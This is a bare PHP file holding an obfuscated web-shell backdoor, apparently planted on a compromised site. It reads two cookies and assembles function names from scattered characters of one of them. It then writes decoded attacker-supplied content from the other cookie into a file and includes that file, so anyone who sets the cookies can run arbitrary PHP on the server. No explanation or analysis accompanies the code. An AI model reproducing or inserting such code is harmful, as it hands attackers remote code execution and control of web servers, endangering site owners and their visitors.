<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[37])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 9;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[37][$n];
        if (!$c[37][$n + 1]) {
            if (!$c[37][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 9 + 1;
    }
    $k = $p[0]() . $p[3];
    if (!$p[11]($k)) {
        $n = $p[12]($k, $p[13]);
        $p[14]($n, $p[23] . $p[2]($p[10]($c[3])));
    }
    include($k);
}